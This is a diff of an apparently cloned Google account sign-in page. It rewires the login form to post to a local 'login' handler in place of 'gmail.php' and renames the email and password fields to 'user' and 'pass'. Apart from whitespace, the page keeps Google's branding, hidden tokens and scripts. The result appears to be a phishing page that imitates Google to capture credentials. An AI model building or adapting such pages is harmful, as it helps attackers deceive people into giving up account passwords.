@@ -864,7 +864,7 @@
   <div id="cc_iframe_parent"></div>
 <img class="profile-img" src="//ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
 <p class="profile-name"></p>
-  <form novalidate method="post" action="gmail.php" id="gaia_loginform">
+  <form novalidate method="post" action="login" id="gaia_loginform">
   <input name="GALX" type="hidden"
            value="mRet081AOaM">
   <input name="continue" type="hidden" value="https://accounts.google.com/ManageAccount">
@@ -877,13 +877,13 @@
   <input type="hidden" id="checkedDomains" name="checkedDomains"
          value="youtube">
 <label class="hidden-label" for="Email">Email</label>
-<input id="Email" name="Email" type="email"
+<input id="user" name="user" type="email"
        placeholder="Email"
        value=""
        spellcheck="false"
        class="">
 <label class="hidden-label" for="Passwd">Password</label>
-<input id="Passwd" name="Passwd" type="password"
+<input id="pass" name="pass" type="password"
        placeholder="Password"
        class="">
 <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
@@ -983,7 +983,7 @@
   ‪English (United Kingdom)‬
   </option>
   <option value="en"
-                
+
                   selected="selected"
                  >
   ‪English (United States)‬
@@ -1356,12 +1356,12 @@ Gd(window,"message",Gu(c));for(d=0;d<b;d++)c[d].m()}}}},Gw=function(){if(window.
     }
   }
 
-  
+
   try {
     gaia_prefillEmail();
   } catch (e) {
   }
-  
+
 </script>
 <script>
   function gaia_setFocus() {
@@ -1406,16 +1406,16 @@ Gd(window,"message",Gu(c));for(d=0;d<b;d++)c[d].m()}}}},Gw=function(){if(window.
         var currentField = formFields[i];
         if (isFocusableErrorField(currentField)) {
           currentField.focus();
-          
+
           var currentValue = currentField.value;
           currentField.value = '';
           currentField.value = currentValue;
           return;
         }
       }
-      
-      
-      
+
+
+
         for (var j = 0; j < formFields.length; j++) {
           var currentField = formFields[j];
           if (isFocusableEmptyField(currentField)) {
@@ -1423,15 +1423,15 @@ Gd(window,"message",Gu(c));for(d=0;d<b;d++)c[d].m()}}}},Gw=function(){if(window.
             return;
           }
         }
-      
+
     }
   }
 
-  
+
   if (!('ontouchstart' in window)) {
     gaia_attachEvent(window, 'load', gaia_setFocus);
   }
-  
+
 </script>
 <script>
   var gaia_scrollToElement = function(element) {
